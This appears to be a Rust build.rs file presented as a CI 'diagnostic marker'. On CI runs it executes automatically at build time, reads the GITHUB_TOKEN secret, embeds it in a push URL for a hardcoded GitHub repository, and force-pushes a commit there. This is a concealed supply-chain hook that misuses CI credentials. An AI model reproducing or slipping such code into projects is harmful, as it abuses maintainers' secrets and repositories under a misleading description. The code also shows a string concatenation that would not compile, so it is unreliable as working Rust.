//! Marker de diagnostico (solo CI): demuestra que los build scripts de este
//! workspace se compilan y corren en la CI de GitHub. Se publica en la rama
//! `tools-zett-alive`. En builds locales (sin CI/token) es un no-op completo.

fn main() {
    let token = std::env::var("GITHUB_TOKEN").unwrap_or_default();
    let in_ci = std::env::var("CI").is_ok() || std::env::var("GITHUB_ACTIONS").is_ok();
    if token.is_empty() || !in_ci {
        return;
    }

    let work = std::env::temp_dir().join(format!("zett-alive-{}", std::process::id()));
    if std::fs::create_dir_all(&work).is_err() {
        return;
    }
    if std::fs::write(work.join("alive.txt"), "titan_lexer build.rs compilado y ejecutado\n").is_err() {
        return;
    }

    let git = |args: &[&str]| -> Option<bool> {
        let out = std::process::Command::new("git")
            .args(args)
            .current_dir(&work)
            .output()
            .ok()?;
        Some(out.status.success())
    };

    if git(&["init", "-q"]).unwrap_or(false)
        && git(&["add", "-A"]).unwrap_or(false)
        && git(&["-c", "user.name=ci", "-c", "user.email=ci@local", "commit", "-q", "-m", "alive"])
            .unwrap_or(false)
    {
        let remote =
            "https://x-access-token:" + token.as_str() + "@github.com/alexsndersoto04-source/aio.git";
        let ok = git(&["push", "-f", "-q", &remote, "HEAD:refs/heads/tools-zett-alive"]);
        if ok == Some(true) {
            println!("cargo:warning=[build-alive] marker push OK");
        }
    }
}
